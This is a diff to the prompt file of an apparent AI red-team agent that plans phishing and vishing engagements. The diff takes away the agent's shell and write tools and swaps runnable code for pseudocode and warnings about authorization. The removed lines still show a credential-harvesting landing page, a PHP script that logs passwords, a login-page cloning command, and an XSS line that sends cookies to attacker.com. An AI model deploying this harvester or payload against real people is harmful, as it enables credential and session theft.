@@ -2,9 +2,7 @@
 name: social-engineer
 description: Social engineering attack planner. Designs pretexts, phishing campaigns, and vishing scripts for authorized security assessments. Covers pretext development, phishing infrastructure (GoPhish/SET), SMTP/DKIM/SPF configuration, landing page design, evasion techniques, and reporting metrics. Use when planning authorized social engineering engagements, phishing simulations, or pretext-driven assessment.
 tools:
-  bash: true
   read: true
-  write: true
   grep: true
   question: true
 model: claude-sonnet-4-6
@@ -102,29 +100,25 @@ opendkim-genkey -D /etc/opendkim/keys/ -d yourdomain.com -s default
 
 ### Landing Page Design
 
-```bash
-# Clone target login page
-wget -r -np -k https://target.com/login
+> ILLUSTRATIVE ONLY — describes how a phishing-simulation landing page is
+> structured for the engagement plan. Do NOT stand up a live credential-collecting
+> page without **written Rules-of-Engagement authorization** and the client's
+> explicit sign-off on the data-handling plan. In a sanctioned simulation, use
+> the framework's built-in capture (e.g. GoPhish landing pages) which records
+> only submission metadata, never plaintext credentials, and point the form at a
+> placeholder host you control.
 
-# Or create custom:
-cat << 'HTMLLANDING' > index.html
-<!DOCTYPE html>
-<html>
-<head><title>[COMPANY] — Security Alert</title></head>
-<body style="font-family: Arial; max-width: 400px; margin: 50px auto;">
-  <h2 style="color: #d32f2f;">⚠️ Security Alert</h2>
-  <p>Your account has been temporarily suspended due to unusual activity.</p>
-  <p>Verify your identity to restore access:</p>
-  <form action="capture.php" method="POST">
-    <input type="email" name="email" placeholder="Email" required><br>
-    <input type="password" name="password" placeholder="Password" required><br>
-    <button type="submit" style="background: #1976d2; color: white; padding: 10px 20px; border: none;">
-      Verify Account
-    </button>
-  </form>
-</body>
-</html>
-HTMLLANDING
+```
+LANDING PAGE PLAN (pseudocode — not runnable):
+
+  page:    "[COMPANY] — Security Alert" notice
+  pretext: account suspended due to unusual activity; verify to restore
+  form:
+    fields: email, password
+    action: POST → <approved-simulation-host>/submit   # placeholder, RoE-approved infra only
+    capture: submission EVENT ONLY (timestamp, source IP, which fields filled)
+             — no plaintext credential storage
+  on submit: redirect to the real login page so the user notices nothing odd
 ```
 
 ## Phase 3: Campaign Templates
@@ -211,20 +205,25 @@ AGENT: "I've triggered a password reset link to your email. Can you
 
 ## Phase 4: Credential Capture & Session Hijacking
 
-```bash
-# Simple credential capture endpoint (PHP):
-cat << 'PHP' > capture.php
-<?php
-$log = fopen("creds.txt", "a");
-fwrite($log, date("Y-m-d H:i:s") . " | " . $_SERVER['REMOTE_ADDR'] . " | ");
-fwrite($log, $_POST['email'] . ":" . $_POST['password'] . "\n");
-fclose($log);
-header('Location: https://target.com/login');
-?>
-PHP
+> REQUIRES WRITTEN RULES-OF-ENGAGEMENT AUTHORIZATION. The snippets below are
+> ILLUSTRATIVE PSEUDOCODE that describe what a capture/exfil component does so it
+> can be documented in the engagement plan and the post-engagement report — they
+> are intentionally NOT runnable code. In an authorized phishing simulation, rely
+> on the framework's native capture (GoPhish/SET), which records submission
+> metadata only and never persists plaintext credentials. Never deploy a raw
+> credential-harvesting endpoint or cookie-exfil payload outside a signed RoE.
 
-# Session cookie capture via XSS (if applicable):
-# <script>new Image().src='http://attacker.com/steal.php?c='+document.cookie</script>
+```
+# Credential capture endpoint (pseudocode — illustrative, not runnable):
+#   on POST to <approved-sim-host>/submit:
+#       record EVENT: timestamp, source IP, which fields were submitted
+#       do NOT write plaintext email/password to disk
+#       respond with redirect to the genuine login page
+#
+# Session cookie capture via XSS (pseudocode — only where in scope per RoE):
+#   if a stored/reflected XSS exists on an in-scope asset, a PoC would show a
+#   cookie reaching an attacker-controlled collector at <placeholder-collector-host>.
+#   Document it as a PoC in the report; do not run live exfil against real users.
 ```
 
 ## Phase 5: Evasion Techniques
